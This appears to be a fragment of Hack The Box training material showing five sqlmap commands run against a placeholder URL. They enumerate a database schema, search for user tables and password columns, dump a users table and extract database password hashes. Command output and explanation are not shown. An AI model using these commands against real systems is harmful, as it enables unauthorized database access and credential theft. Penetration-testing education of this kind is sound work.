...
```shell-session
frank-106@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --schema
...
```shell-session
frank-106@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -T user
...
```shell-session
frank-106@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -C pass
...
```shell-session
frank-106@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
...
```shell-session
frank-106@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch
